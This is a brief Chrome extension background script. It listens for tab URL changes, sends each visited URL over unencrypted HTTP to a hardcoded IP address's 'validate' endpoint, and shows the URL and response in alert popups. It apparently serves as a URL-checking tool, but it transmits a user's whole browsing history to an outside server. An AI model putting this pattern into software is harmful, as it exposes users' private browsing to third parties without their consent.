chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) 

 {

 if (changeInfo.url != undefined) 
  {
   var http = new XMLHttpRequest(); 
   http.open("GET",
   "http://13.71.114.110:8888/validate?command="+changeInfo.url, 
    true);
    sendme = changeInfo.url
    http.send(sendme);
     alert(sendme);
     http.onreadystatechange = function() {
    if (http.readyState == XMLHttpRequest.DONE) {
        alert(http.responseText);
    }
}

    }

  
}); 